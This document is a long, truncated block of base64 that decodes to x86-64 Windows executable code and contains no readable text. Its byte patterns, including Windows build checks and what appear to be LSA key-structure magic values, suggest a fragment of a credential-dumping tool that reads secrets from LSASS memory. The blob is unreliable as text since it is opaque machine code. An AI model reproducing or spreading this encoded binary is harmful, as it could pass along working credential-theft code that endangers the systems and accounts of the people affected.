LN0yNRCRIjVMJSIvOSIlEJCD/FXe7AACFwA+EpgEAAEiDfwgAD4SBAAAASI2EJLAAAABFM8lFM8CL00iLzkiJRCQg/xVGuwAAhcB1JEiNhCSwAAAATI1EJEBIjVQkOEUzyUiLzkiJRCQg6IRZ///rAjPAhcB0TEiLVwhIi0wkOP8V0cAAAEiLTCQ4M9KFwA+UwomUJKgAAAD/FSi+AABIi0wkQP8VHb4AAOsXi08Qhcl0EDPAO0wkSA+UwImEJKgAAACDvCSoAAAAAA+E/AAAAESLTCRkOVwkYLgDAAAARA9EyEUzwEiNRCQwSIlEJChBjVAMSIvOx0QkIAIAAAD/FZK7AACFwA+EwAAAAEiLF0iF0nQzSItMJDCDpCSoAAAAAEyNhCSoAAAA/xVvuwAAhcB1FP8VHb0AAEiNDV56AQCL0OhLLf//g7wkqAAAAAB0YkiNDeZ6AQCL1egzLf//SIvO6Cf9//+DfxQAdE1Ii1QkMDPJ/xUUuwAAhcB0H0iNDcF6AQDoCC3//zPSM8noM/j//4OkJKgAAAAA6x3/FbO8AABIjQ3EegEAi9Do4Sz//+sHiZwkqAAAAEiLTCQw/xWpvAAAi5wkqAAAAIvDSIucJKAAAABIgcSAAAAAX15dw8xIg+w4TI0N8XsBAEyNBQJ8AQBIjQ3j6AEAugQAAADHRCQgAQAAAOi9L///M8BIg8Q4w8zMSIPsKEiNDd19AQD/FYe7AABIiQWI9wEASIXAD4Q5AQAASI0V2H0BAEiLyP8VX7sAAEiLDWj3AQBIjRXZfQEASIkFYvcBAP8VRLsAAEiLDU33AQBIjRXWfQEASIkFT/cBAP8VKbsAAEiLDTL3AQBIjRXLfQEASIkFPPcBAP8VDrsAAEiLDRf3AQBIjRXIfQEASIkFKfcBAP8V87oAAEiLDfz2AQBIjRXFfQEASIkFFvcBAP8V2LoAAEiLDeH2AQBIjRW6fQEASIkFA/cBAP8VvboAAEiLDcb2AQBIjRWvfQEASIkF8PYBAP8VoroAAEiDPbL2AQAASIkF4/YBAEiJBeT2AQB0TUiDPaL2AQAAdENIgz2g9gEAAHQ5SIM9nvYBAAB0L0iDPZz2AQAAdCVIgz2a9gEAAHQbSIM9mPYBAAB0EUiFwHQMxwWf9gEAAQAAAOsHgyWW9gEAADPASIPEKMPMzMxIg+woSIsNMfYBAEiFyXQG/xUmugAAM8BIg8Qow8zMzEiLxEiJWAhVVldBVEFVQVZBV0iD7HBFM/9EOT1M9gEAD4SKBAAATI1AsEiNUCAzyf8V9vUBAEE7xw+MZgQAAEWL70Q5vCTIAAAAD4ZVBAAASI09MdsAAEiNDb58AQDolSr//0iLRCRYQYvdSAPbSI0M2OgFVP//SIvP6Hkq//9Mi1wkWEyNRCRASY0M2zPS/xWf9QEAQTvHD4z2AwAASItMJEDo2AgAAEiLTCRATI1MJFBMjYQkwAAAADPS/xWC9QEAQTvHD4y+AwAAi5QkwAAAAEiNDVt8AQDoGir//0WL90Q5vCTAAAAAD4aPAwAASYvvSYv3gT0N9wEAQB8AAEiLXCRQQYvWSI0NRnwBAA+DawEAAEyLRB4Q6Nop//9IjQ1HfAEA6M4p//9Fi95LjQTbTI0kw0mLzOg/U///SIvP6LMp//9IjQ1QfAEA6Kcp//9JjUwkMOhlUv//SIvP6JUp//+LVB44SI0NXnwBAOiFKf//SI0NinwBAOh5Kf//SItMHhjorwgAAEiLz+hnKf//SI0NnHwBAOhbKf//SItMHiDokQgAAEiLz+hJKf//SI0NrnwBAOg9Kf//SItMHijocwgAAEiLz+grKf//QYv/RDl8Hjx2MkiNDbZ8AQCL1+gTKf//i89IweEFSANMHkDoQwgAAEiNDYzZAADo9yj////HO3wePHLOSItMJEBMiXwkYEyLTB4gTItEHhhIjUQkYEmL1EiJRCQwRIl8JChMiXwkIP8VIvQBAEiNDYN8AQCL2OiwKP//QTvfdRBIi0wkYEiLSSjo3QcAAOsOSI0NkHwBAIvT6I0o//9IjT0W2QAASIvP6H4o///p5gEAAEyLRCsQ6G8o//9IjQ3cegEA6GMo//9Fi95PjTybScHnBEwD+0mLz+jRUf//SIvP6EUo//9IjQ3iegEA6Dko//9JjU846PhQ//9Ii8/oKCj//4tUK0BIjQ3xegEA6Bgo//9IjQ0dewEA6Awo//9Ii0wrGOhCBwAASIvP6Pon//9IjQ0vewEA6O4n//9Ii0wrIOgkBwAASIvP6Nwn//9IjQ1BewEA6NAn//9Ii0wrKOgGBwAASIvP6L4n//9IjQ0TfAEA6LIn//9Ii0wrMOjoBgAASIvP6KAn//8z/zl8K0R2MkiNDS17AQCL1+iKJ///i89IweEFSANMK0jougYAAEiNDQPYAADobif////HO3wrRHLOSItMJEAz/0iNRCRISIlEJDhIiXwkSEiLRCswTItMKyBMi0QrGIl8JDBJi9dIiXwkKEiJRCQg/xWW8gEASI0N73oBAESL4OgbJ///RDvndRBIi0wkSEiLSSjoSAYAAOsPSI0Ni3sBAEGL1Oj3Jv//SI0NgNcAAOjrJv//M9tMjQ0+wgAASYsXi8dIweAFSjsUCHUPSYtXCEo7VAgIdQQzwOsFG8CD2P+FwA+EiQAAAP/HSP/Dg/8GcstIjT021wAASItMJEhFM/9JO890Bv8V7/EBAEH/xkiDxkhIg8VQRDu0JMAAAAAPgnf8//9Ii0wkUP8Vy/EBAEiNTCRA/xW48QEAQf/FRDusJMgAAAAPgrL7//9Ii0wkWP8VpPEBADPASIucJLAAAABIg8RwQV9BXkFdQVxfXl3DSMHjBUiNDQ97AQBKi1QLEOgZJv//TI0NbsEAAEqLRAsYSIXAD4RX////RYXkdQpMi0QkSE2FwHUDRTPAi89Ji9dIweEFSQPJQbkBAAAA/9BIjT1n1gAASIvP6M8l///pJP///8zMSIlcJAhIiWwkIFZXQVRIg+xgSItCIDP/SYvYSIvqTIvhSIXAD4T+AQAAg3gICA+F9AEAAEiNDZl6AQDoiCX//0iLTSBMjUQkOEiLSRhIjVQkMEUzyeiOUf//hcB0LkyLRCQwSItUJDhIjQ2VegEA6FQl//9Ii0wkMP8VfbUAAEiLTCQ4/xVytQAA6w1Ii00gSItJGOjnTv//SI0NuNUAAOgjJf//QYE8JCuhuLQPhXUBAABIjUQkUEiNFVV6AQBBuQgAAABFM8BIx8ECAACASIlEJCD/FYKxAACFwA+FOAEAAEiLTSBIjVQkSEiLSRjoKk4AAIXAD4T9AAAASItUJEhIi0wkUEiNhCSQAAAAQbkBAAAARTPASIlEJCD/FTqxAACFwA+FtAAAAEiLjCSQAAAASI2EJIgAAABIjRV7egEASIlEJChIIXwkIEUzyUUzwP8V7bAAAIXAdWWLlCSIAAAAjUhA/xWJtAAASIv4SIXAdFtIi4wkkAAAAEiNhCSIAAAASI0VMnoBAEiJRCQoRTPJRTPASIl8JCD/FaSwAACFwHQqSI0NKXoBAIvQ6BYk//9Ii8//FUG0AABIi/jrDkiNDd16AQCL0Oj6I///SIuMJJAAAAD/FZCwAADrDkiNDY97AQCL0OjcI///SItMJEj/FQW0AADrFP8VjbMAAEiNDT58AQCL0Oi7I///SItMJFD/FVSwAADrDkiNDfN8AQCL0OigI///SIXbdG5Ii0MoSIXAdGWDeAgIdV8Pt3AQSItYGEiNDal9AQBmiXQkOmaJdCQ4SIlcJEDoaSP//0iNTCQ46ANK//+FwHQRSI0N8NMAAEiL0+hMI///6xEPt9ZBuAEAAABIi8voeUv//0iNDcLTAADoLSP//0iLRUhIhcAPhJABAACDfUQAD4aGAQAAQYE8JPUz4LIPhGIBAABBgTwkK6G4tHR5QYE8JJFyyP50EUiNDbl/AQDo6CL//+lTAQAAg3gICA+FSQEAAEiLWBhIjQ1KfwEAiztIA/voxCL//4tTCIP6AXYVi0MESI0NXn8BAP/KTI0ER+inIv//i1MEg/oBdhFIjQ1UfwEA/8pMi8fojiL//0iNDRfTAADrmIN4CAgPhesAAABIi1gYSIX/dBhIjQ3/fAEASIvX6GMi//9Ii8//FY6yAABIjQ0ffQEA6E4i//8z/0iDwwxIjQ1dfQEAi9foOiL//4tT9IvKhdJ0W4PpAXRGg/kBdA5IjQ2UfgEA6Bsi///rVoN7BABIjQ16fQEASI0Fi30BAEgPRcFIjQ2ofQEASIlEJCCLU/hEi0P8RIsL6Ogh///rI4tDBEiNDeh9AQCJRCQg699Ei0P8i1P4SI0N/HwBAOjDIf//SI0NTNIAAOi3If///8dIg8MUg/8DD4Jg////6xaDeAgCdRAPt1AQSI0N8XsBAOiQIf//TI1cJGBJi1sgSYtrOEmL40FcX17DzMzMTIvcU0iD7EAzwE2NQ9gz0kmJQ9hJiUPgSYlD6MdEJCABAAAASIvZ/xWP7AEAhcB4HEiLVCQoSI0NF34BAOg2If//SItMJCj/FYfsAQAzwIE9M+4BAEAfAABMjUQkIEiJRCQgSIlEJChIiUQkMBvASIvLM9KD4ASDwASJRCQg/xU47AEAhcB4KkiLRCQoSI0V6H0BAEiNDfl9AQBIhcBID0XQ6NEg//9Ii0wkKP8VIuwBAEiDxEBbw0iFyQ+EhAAAAFNIg+wgi1EISIvZRIvKQYPpAnRbQYPpAnRJQYPpA3QxQYP5AXQXSI0N3n0BAOiFIP//SI1LELoEAAAA6weLURBIi0kYQbgBAAAA6KhI///rLkiLURBIjQ330AAA6FYg///rHItREEiNDZZ9AQDrCw+3URBIjQ2BfQEA6Dgg//9Ig8QgW8PMzEyL3EmJawhWV0FUQVVBVkiB7AABAABFM/ZJjYNg////TIviSIlEJHhJjYNg////RIvpTYlzIEGL9kWJs2D///9IiUQkaE2Js2j///9MiXQkcEyJdCRgRDk1S+sBAA+F/wEAAEyNBcpCAQBFM8lMiXQkIOi9Sf//QTvGD4TiAQAAixW+7AEASYv+SI0FXNoBAEmLzjkQdxRIg8FQSIv4SIPAUEiB+UABAABy6Ek7/g+EBwMAAEiLRxBIjRWdzwAAQbgBAAAASIlEJHBIi0cgM8lIiUQkYP8VEawAAEk7xnQZSI2UJNgAAABIjQ1VQgEATIvA6F1D///rA0GLxkE7xg+ERAEAAESLhCT0AAAAM9K5OAQAAP8V4q4AAEiL6Ek7xg+EFAEAALoQAAAAjUow/xUorwAASIvwSImEJIAAAABJO8Z0F0yNhCSAAAAASIvVuQEAAADoYxX//+sDQYvGQTvGD4RUAgAATI2EJJgAAABIjRUmfAEASIvO6O4q//9BO8YPhJIAAACLhCSoAAAAi08Y8w9vhCSYAAAARItHCEyJdCRITIlkJEDzD3+EJLgAAABIiYQkyAAAAEiNBUD+//9EiWwkOEiJRCQwi0coTI1MJGCJRCQoSIlMJCBIjVQkcEiNjCS4AAAAxwW26QEAAQAAAOitH///QTvGdRT/FfKtAABIjQ2zewEAi9DoIB7//0SJNZHpAQDrFP8V1a0AAEiNDQZ8AQCL0OgDHv//SIvO6FsV///pgQEAAP8VtK0AAEiNDaV8AQDrDf8Vpa0AAEiNDfZ8AQCL0OjTHf//6VkBAABMjSWrfQEATI2MJEgBAABMjYQkQAEAAIvWM8n/FcmrAABBO8YPhBsBAABBi+5EObQkQAEAAA+G/AAAAEmL/kiLhCRIAQAATIsUB0GLSgSD+QdzDUyNHRi4AABNixzL6wdMjR0LfQEATTlyEEyJXCQwiUwkKEmLxE2LzE2LxEkPRUIQTTlySEmL1E0PRUpITTlyQEiNDTF9AQBND0VCQE05cghIiUQkIEkPRVII6B0d//9Mi5wkSAEAAEqLBB9Ii0goSIlMJFhKiwQfD7dIIGaJTCRSZolMJFBIjUwkUOiQQ///QTvGdBNIjVQkUEiNDX/NAADo1hz//+seSIuEJEgBAABBuAEAAABIiwwHi1EgSItJKOj2RP//SI0NW30BAOiqHP///8VIg8cIO6wkQAEAAA+CB////0iLjCRIAQAA/xWdqgAA/8aD/gF3DYM9i+kBAAUPh67+//8zwEiLrCQwAQAASIHEAAEAAEFeQV1BXF9ew8zMzEyL3FdIgeyQAAAAM/9JjUOoSYlDiEmNQ5iJfCQwSYlDkIsFsdYBAEmJe6A7xw+N1gEAAEg5PZrnAQB1HUiNDcl8AQD/FSurAABIiQWE5wEASDvHD4SqAQAATI1EJHBIjRVfeQEASI1MJDDoJSj//zvHD4SMAQAA8w9vRCRwi4QkgAAAAEiJRCRg8w9/RCRQSDk9TucBAA+FiQAAAEiLDTHnAQBIjRVyfAEA/xW8qgAASIlEJEhIO8d0W0iLDRPnAQBIjRVsfAEA/xWeqgAASIlEJEBIO8d0PUUzyUyNRCRQSI1MJCBBjVEQ6BYV//87x3QjSItMJGhIi4HYAAAASIkF1+YBAEiLgeAAAABIiQXR5gEA6wdIiwXI5gEASDvHD4TeAAAARTPJSI0FjdUBAEyNRCRQQY1RCkiNTCQgSIlEJCDovRT//zvHD4S0AAAASItMJGhIY0G9SI1UCMFIY0HvTI1UCPNIY0HdSIkV4+cBAEyNTAjhSGNB6EyJFdvnAQBMjUQI7EyJDb/nAQBMiQWw5wEASDvXdGpMO9d0ZUw7z3RgTDvHdFu6AAEAALlAAAAAQYkQ/xXJqgAAupAAAABMi9hIiwWS5wEAjUqwTIkY/xWuqgAATIvYSIsFbOcBAEyJGEiLBXLnAQBIOTh0FIsF49QBAEw73w9Fx4kF19QBAOsGiwXP1AEASIHEkAAAAF/DzMxIg+woSIsNPecBAEiFyXQJSIsJ/xVfqgAASIsNGOcBAEiFyXQJSIsJ/xVKqgAASIsNi+UBAEiFyXQG/xUoqQAAM8BIg8Qow8xMi9xJiVsQV0iD7HBMiwEz/0iNBUjUAQBJiUO4SY1DyE2JQ7BJiUPASIsCTYlD4EmJQ9iLQhCJfCRATY1D2I1XCkmNS7hFM8lJiUPouyUCAMBJiXvQSYl7qEmJe/DoRhP//zvHD4TJAAAASItEJGhEjUcESI1UJCBIg8C9SI1MJDBIiUQkIEiNhCSAAAAASIlEJDDoNBH//zvHD4STAAAASItEJGhIY4wkgAAAAESNRwhIjUwBwUiLBTvmAQBIjVQkIEiJTCQgSI1MJDBIiUQkMOj2EP//O8d0WUiLRCRoSIsVCuYBAEiNTCQgSIPA3UG4kAAAAEiJRCQgSIsS6EIAAAA7x3QtSItEJGhIixXu5QEASI1MJCBIg8DvQbgAAQAASIlEJCBIixLoFgAAADvHD0Xfi8NIi5wkiAAAAEiDxHBfw8xMi9xJiVsQSYlrGEmJcyBXSIPsQEmNQ+gz20iL6kmJQ+BJi/BIi/lIi9FJjUMIiVwkMESNQwRJjUvYSYlb8EmJQ9joQRD//zvDdD1IY0QkUESNQwhIjUwkIEiDwARIi9dIiXwkIEgBB+gbEP//O8N0F0iNTCQgTIvGSIvXSIlsJCDoAhD//4vYSItsJGBIi3QkaIvDSItcJFhIg8RAX8PMSIPsKIM9XdIBAAAPjWgBAABIgz2T4wEAAA+F/QAAAEiNDe54AQD/FQinAABIiQV54wEASIXAD4Q9AQAASI0V4XgBAEiLyP8V4KYAAEiLDVnjAQBIjRXqeAEASIkFU+MBAP8VxaYAAEiLDT7jAQBIjRXneAEASIkFQOMBAP8VqqYAAEiLDSPjAQBIjRXkeAEASIkFLeMBAP8Vj6YAAEiLDQjjAQBIjRXpeAEASIkFGuMBAP8VdKYAAEiLDe3iAQBIjRXeeAEASIkFB+MBAP8VWaYAAEiLDdLiAQBIjRXTeAEASIkF9OIBAP8VPqYAAEiLDbfiAQBIjRXQeAEASIkF4eIBAP8VI6YAAEiDPZviAQAASIkF1OIBAHUJ611IiwXJ4gEASIM9ieIBAAB0TEiDPYfiAQAAdEJIgz2F4gEAAHQ4SIM9g+IBAAB0LkiDPYHiAQAAdCRIgz1/4gEAAHQaSIM9feIBAAB0EEiFwHQL6KUAAACJBe/QAQCLBenQAQBIg8Qow0iD7ChIiw0d4gEASIXJdHyDPc3QAQAAfG1Iiw1A4wEASIXJdAgz0v8VO+IBAEiLDTTjAQBIhcl0Bv8VIeIBAEiLDSrjAQD/FXymAABIiw3N4gEASIXJdAgz0v8VCOIBAEiLDcHiAQBIhcl0Bv8V7uEBAEiLDbfiAQD/FUmmAABIiw2i4QEA/xUspQAAM8BIg8Qow8xAU0iD7DBIjRXHdwEASI0NuOIBAEUzyUUzwP8VfOEBAIvYhcAPiBwBAABIiw2b4gEAg2QkIABMjQWndwEASI0VwHcBAEG5IAAAAP8VVOEBAIvYhcAPiOwAAABIiw1r4gEAg2QkKABIjUQkQEyNBXLiAQBIjRWrdwEAQbkEAAAASIlEJCD/FSLhAQCL2IXAD4iyAAAAixVK4gEAuUAAAAD/FYelAABIjRWYdwEASI0N2eEBAEUzyUUzwEiJBRziAQD/FdbgAQCL2IXAeHpIiw254QEAg2QkIABMjQVtdwEASI0VHncBAEG5IAAAAP8VsuABAIvYhcB4TkiLDY3hAQCDZCQoAEiNRCRATI0FlOEBAEiNFQ13AQBBuQQAAABIiUQkIP8VhOABAIvYhcB4GIsVcOEBALlAAAAA/xXtpAAASIkFVuEBAIvDSIPEMFvDzMxBuAEAAADpCQAAAMxFM8DpAAAAAEiD7GjzD28FPOEBAEyLFU3gAQBFhcBMD0UVOuABAEyL2fMPf0QkUPbCB3QOSI0N/eABALgQAAAA6wxIjQ0v4QEAuAgAAACDZCRIAEiLCUyNRCR4TIlEJECJVCQ4TIlcJDCJRCQoSI1EJFBEi8JFM8lJi9NIiUQkIEH/0kiDxGjDTIvcSYlbEEmJaxhJiXMgV0FUQVVIg+xwTIsBRTPtg3kMAkmNQ7hMi+G+JQIAwEmJQ7BIiwJFiWu4SYlDyItCEE2Ja8BNiWuYTYlDoE2JQ9BJiUPYTYlr4HMoQYN8JAwBQY1NDUiNBcXNAQCNaQxzCI15ro1ZMusfv8P///+NX3jrFb0XAAAASI0Fys0BAI19o41dJ41N9YvRTI1EJFBIjUwkMEUzyUiJRCQw6BgN//9BO8UPhMcAAABIY8NIjVQkIEiNTCQwSANEJGhBuAQAAABIiUQkIEiNhCSQAAAASIlEJDDoBAv//0E7xQ+EjwAAAEiLRCQgSGOMJJAAAABIjVQkIEiNTAgESI0Fud8BAEG4EAAAAEiJTCQgSI1MJDBIiUQkMOjDCv//QTvFdFJIY8dMjQWw3wEASY1UJAhIA0QkaEiNTCQgSIlEJCDoSwAAAEE7xXQqSGPNTI0FSN8BAEmNVCQISANMJGhIiUwkIEiNTCQg6CMAAABBO8VBD0X1TI1cJHCLxkmLWyhJi2swSYtzOEmL40FdQVxfw0iLxEiJWBBIiWgYSIlwIFdBVEFVSIHsgAAAADPbg3oEAkiJSKiJWLhIiVjASI1AuE2L6EiL6UiJRCRIcwmNcyBEjWMY6xqDegQDcwu+MAAAAESNZvjrCb5AAAAARI1m+EiL1rlAAAAA/xU+ogAASIv4SDvDD4Q8AQAASI2EJKAAAABIjUwkQEG4BAAAAEiL1UiJRCRA6LYJ//87ww+ECwEAAEhjhCSgAAAASI1MJEBBuAgAAABIg8AESIvVSIlsJEBIAUUA6IYJ//87ww+E2wAAAEiNRCRgSI1MJEBBuCAAAABIi9VIiUQkQOhhCf//O8MPhLYAAACBfCRkUlVVVQ+FqAAAAEiLRCRwSI1MJEBMi8ZIi9VIiXwkQEiJRQDoLQn//zvDD4SCAAAAgX8ES1NTTXV5SWP0uUAAAACLFD7/FWehAABIiUQkQEg7w3ReSItEJHBIi9VIjUwGBEiJTQBEiwQ+SI1MJEDo4gj//zvDdDCLBD5Fi00YTYtFEEmLTQCJXCQwiUQkKEiLRCRASY1VCEiJRCQg/xWX3AEAO8MPncNIi0wkQP8VB6EAAEiLz/8V/qAAAEyNnCSAAAAAi8NJi1soSYtrMEmLczhJi+NBXUFcX8PMzMxIiVwkEFdIg+wgSIsNi9wBAP8VpaIAAEiLDWbcAQBIgyV23AEAAEiFyXQvixGD6gF0DIP6AXQHSItcJDDrB0iLQQhIixjovgf//0iLy0iJBTDcAQD/FSqgAABIjR2TqQAAvwgAAABIiwsz0kSNQihIg8Eg6AhDAABIg8MISIPvAXXkSItcJDhIg8QgX8PMzMxIg+woSI0NSXkBAOgIEP//6Fv///8zwEiDxCjDSIlcJAhXSIPsIIvZSI0NTXkBAEiL+ujhD///g/sBdA5IjQ1xeQEA6NAP///rJOgh////SIsP/xXcoQAASI0N1f8AAEiL0EiJBaPbAQDoqg///zPASItcJDBIg8QgX8PMgz2l3AEABkiNDWqqAABIjQWLqgAASA9CwUiJBfDbAQAzwMPMSIsF5dsBAEj/YAjMTIvcSYlbCFdIg+xQg2QkQABJg2PIAEmDY9gASYNj8AD2QSQESY1D6EmJQ9BIi/lJiVPgD4S9AAAAD7phJAgPgrIAAACBeSgAAAIAD4WlAAAASIsBSItRGLlAAAAASYlD2P8VMZ8AAEiJRCQgSIXAD4SBAAAATItHGEiNVCQwSI1MJCDotAb//0yLVCQghcB0XEiLRxhJi9pJjQwCTDvRc0xIi8voHzX//4XAdC9IjUsQ6BI1//+FwHQiSI1LIOgFNf//hcB0FTPSQbgDAAAgSIvL6E0OAABMi1QkIEiLRxhIg8MESY0MAkg72XK0SYvK/xWqngAAuAEAAABIi1wkYEiDxFBfw8zMSIPsOEiNBaWnAABIjVQkIEiNDfEHAABIiUQkIMdEJCgIAAAA6CsEAABIg8Q4w8zMSIPsKOgjAAAAhcB4FkiLDfzZAQBIjRWt/v//TIvB6Lka//8zwEiDxCjDzMxIiVwkEEiJdCQYV0FUQVVIg+xwRTPtQYv9SYv1QYvdTDktvtkBAA+FQAMAAEiLBUnaAQC/JQIAwP8QQTvFD4wdAwAASIsVstkBAEk71XQ9SI0N7ncBAEWNZQLoqQ3//0iLDZbZAQBMiWwkMEWNRQFFM8m6AAAAgESJbCQox0QkIAMAAAD/FXqdAADrZUiNRCRASI0V/HcBAEiNTCRASIlEJFBIjYQkkAAAAEG8AQAAAEiJRCRYRIlsJGDodzcAAEiNVCRQSI0NeRP//+jAEv//QTvFfCFEOWwkYHQaRIuEJJAAAAAz0rk6BAAA/xXjnAAASIvw6wxIjQ23dwEA6AYN//9JO/UPhB4CAABIg/7/D4QUAgAAuhAAAACNSjD/FRGdAABIiQW62AEASTvFdBRMjQWu2AEASIvWQYvM6FMD///rA0GLxUE7xQ+EzAEAAEGD/AIPhZIAAABIiwWE2AEAQY1UJAVIi0gISIsJ6FcK//9Ii9BJO8V0X4tICESLBZXZAQCJDWPYAQCLQAxBO8iJBVvYAQCLQhAPlcOJBVPYAQBBO910DItSCEiNDYR3AQDrH0GL3UG4CQAAAGZEOQIPlcNBO910UQ+3EkiNDUN4AQDoMgz//+s3SI0NJXkBALsBAAAA6B8M///rJIsFJ9kBAIkF9dcBAIsFF9kBAIkF7dcBAIsFE9kBAIkF5dcBAEE73Q+FKgEAAIE90tcBAEAfAABBi8UPk8CDPb3XAQAGiQXfvgEAcxCDPbLXAQACRIktf7wBAHMKxwVzvAEAAQAAAEiLDYzXAQBIjRUlAQAARTPA6CkS//9BO8UPjKIAAABEOS19vgEAD4SVAAAASI0dUL4BAEiNDZnCAQBBuCgAAABIi9PoQT4AAIE9UdcBAM4OAABMiWwkMEiNBV3XAQBMjQX+wgEASI0NJ9cBAEkPQsVBuQYAAABIi9NIiUQkKEiNBS7XAQBIiUQkIOikDwAAQTvFdCRIiwWQ1wEASI0N8dYBAEiL0/9QEEE7xYv4fWxIjQ2deAEA6xlIjQ30eAEA6xBIjQ1LeQEA6wdIjQ3CeQEA6OEK///rFP8VnZoAAEiNDR56AQCL0OjLCv//QTv9fSpIiw2b1gEA6BoC//9Ii85IiQWM1gEA/xWGmgAA6wxIjQ1tegEA6JwK//9MjVwkcIvHSYtbKEmLczBJi+NBXUFcX8NIiVwkCEiJdCQQV0iD7CBIi/FIjR23owAAvwgAAABIi1YYSIsLSItSCEiLSRj/FRWdAACFwHUdSIsLRI1AIEiL1sdBQAEAAABIiwtIg8Eg6AI9AABIg8MISIPvAXXASItcJDBIi3QkOI1HAUiDxCBfw8zMzEiLxEiJWAhVVldBVEFVSIHs8AAAAINgIACDZCRwAEiDZCR4AEiDZCRAAEiNQCBMi+JIiUQkIEiNRCRwTIvpSIlEJChIjUQkcL4BAAAASIlEJEjosfv//4vohcAPiDgDAABIjQWE1QEASImEJJAAAABIiwUN1gEASImEJJgAAACLBXfVAQA9uAsAAHMJSI0dCaMAAOtHPXAXAABzCUiNHSGjAADrNz1YGwAAcwlIjR05owAA6yc9QB8AAHMJSI0dUaMAAOsXSI0dmKMAAEiNDbmjAAA9uCQAAEgPQ9kFqOT//z1fCQAAdxCBPf67AQAAAEhTdgRIg8MoSIsF7dQBAEiJRCQ4SIsFCdUBAEiJRCQwSIXAdBdIjVQkMEiNTCQgQbgEAAAA6LYA///rB0iLRCQgiTAz/zm8JDgBAAAPhlcCAABIixOLx7lAAAAASMHgBEgDBbXUAQBIiUQkMEiNhCSAAAAASIlEJCBIjUQkcEiJRCQo/xXDmAAASIlEJEBIhcAPhAMCAABIjVQkMEiNTCQgQbgIAAAA6EQA//+FwA+E2wEAAEiLRCQ4SIuMJIAAAABIiUQkKOm0AQAAhfYPhLwBAABMiwNIjVQkIEiNTCRA6AsA//+FwA+EogEAAEyLRCRAi0MISQPASImEJKAAAACLQwxCiwwAi0MQiYwkuAAAAEKLDACLQxiJjCS8AAAAi0sUSQPASImEJLAAAACLQxxJA8hIiYwkqAAAAEqLFACLQyBIiZQkwAAAAEqLFACLQyRIiZQkyAAAAEqLFABIiZQk0AAAAEiLFZDTAQDoqy7//0iLFYTTAQBIi4wksAAAAOiXLv//g6Qk4AAAAABIg6Qk6AAAAABIjYQkMAEAAEiNVCRQSI1MJGBIiUQkYEiNhCTgAAAAQbgBAAAASIlEJGhIi4QkyAAAAEiDpCTIAAAAAEj/wEiJRCRQSIsFHNMBAEiJRCRY6Ab//v+FwHRHD7aEJDABAABI/0wkULlAAAAAjQSFCAAAAIvQi/D/FTuXAABIiUQkYEiFwHQaSI1UJFBIjUwkYEyLxkiJhCTIAAAA6Lv+/v9IjYwkkAAAAEmL1EH/1UiLjCSoAAAASItJCIvw/xX9lgAASIuMJLAAAABIi0kI/xXrlgAASIuMJMgAAAD/Fd2WAABMi1wkQEmLC0iJTCQgSDtMJDAPhTz+//9Ii0wkQP8VupYAAP/HO7wkOAEAAA+Cqf3//4vFSIucJCABAABIgcTwAAAAQV1BXF9eXcPMzEiJXCQISIlsJBBIiXQkGFdIg+wgg3koA0iL+kiL6XRf6HcAAAAz9jl3CHZTM9tIiwdIixQDg3pAAHQ5SI0FZp8AAEiLBAODeBAAdChIixJIjQ1SdgEA6AEG//9Mix9Ii81KixQb/1IISI0NfbYAAOjoBf///8ZIg8MIO3cIcq9Ii1wkMEiLbCQ4SIt0JEC4AQAAAEiDxCBfw8zMzEyL3FNIg+xQSItBEESLSShIi9lEiwCLUARIi0MgSYlD6EiLQxhIjQ0gvwEASYlD4ItDLIlEJDBKiwTJSI0N2nUBAEmJQ9BEi8pFiUPI6G4F//9Ii0s4SIXJdAXoGC///0iNDem1AABIg8RQW+lPBf//zMzMTIvcSYlbCEmJaxBWV0FUQVVBVkiB7CABAABFM+1JjUOITY2LWP///0yNBUm7AABIi9qL8UiJRCRQTIlsJFhMiWwkYEyJbCRoRIlsJHBMiWwkIOj5Lv//QTvFD4R4BAAATI2MJGgBAABMjQVhyQAASIvTi85MiWwkIOjSLv//QTvFD4RIBAAASI0FAjMBAEyNjCSAAAAATI0FK3YBAEiL04vOSIlEJCDopC7//0iLrCRoAQAATIukJKAAAABMi4wkgAAAAEiNDQ12AQBMi8VJi9TodgT//0yNjCRoAQAATI0FO3YBAEiL04vOTIlsJCDoXC7//0yNNeG0AABBO8UPhJQAAACBPVLRAQBYGwAAcnxIi7wkaAEAAEiDyf8zwGbyr0j30Uj/yUiD+SAPlMBBO8V0UEiLjCRoAQAARY1FEEiNlCS4AAAARIvI6NUr//9BO8V0L0iNhCS4AAAASI0NzXUBAEiJRCRo6N8D//9Ii0wkaEGNVRBFM8DoDiz//0mLzusQSI0NvnUBAOsHSI0NRXYBAOi0A///TI2MJGgBAABMjQXxdgEASIvTi85MiWwkIOiaLf//QTvFD4SWAAAAgT2X0AEAWBsAAHJ+SIu8JGgBAABIg8n/M8Bm8q9I99FI/8lIg/lAD5TAQTvFdFJIi4wkaAEAAEiNlCQAAQAARIvIQbggAAAA6Bgr//9BO8V0L0iNhCQAAQAASI0NiHYBAEiJRCRg6CID//9Ii0wkYEUzwEGNUCDoUSv//0mLzusQSI0NgXYBAOsHSI0NCHcBAOj3Av//TI2MJGgBAABMjQW0dwEASIvTi85MiWwkIOjdLP//QTvFD4SBAAAASIu8JGgBAABIg8n/M8Bm8q9I99FI/8lIg/kgD5TAQTvFdFJIi4wkaAEAAEiNlCSoAAAARIvIQbgQAAAA6Gcq//9BO8V0L0iNhCSoAAAASI0NV3cBAEiJRCRY6HEC//9Ii0wkWEUzwEGNUBDooCr//0mLzusHSI0NQHcBAOhPAv//TDlsJFh1Gkw5bCRodRNMOWwkYHUMSI0N33kBAOnBAQAASIuUJIAAAABEiWwkSLkCAAAASI2EJIgAAABEjUECRTPJSIlEJEBIjQVFuQAASIlEJDhIiWwkMEyJZCQoiUwkIOihE///QTvFD4RNAQAARIuEJJwAAACLlCSYAAAASI0NPncBAOjFAf//SIuMJIgAAABMjUQkeLoIAAIA/xWhjgAAQTvFD4S/AAAASItMJHhBuTgAAABIjYQkYAEAAEGNUdJMjYQkyAAAAEiJRCQg/xV2jgAAQTvFdG+LlCTUAAAARIuEJNAAAABIjQ0LdwEARIvKRIlEJCDoUgH//0iNDTd3AQDoRgH//0iNVCRQSI0NriQAAOgl9///SYvO6C0B//9IjQ06dwEA6CEB//9IjVQkUEiNDTEXAADoAPf//0mLzugIAf//6xT/FcSQAABIjQ01dwEAi9Do8gD//0iLTCR4/xXDkAAA6xT/FaOQAABIjQ2UdwEAi9Do0QD//0iLjCSIAAAARDlsJHB0B+gbKwAA6wq6FQAAQOghKwAASIuMJJAAAAD/FX+QAABIi4wkiAAAAP8VcZAAAOsr/xVRkAAASI0NsncBAIvQ6H8A///rFUiNDdJ4AQDrB0i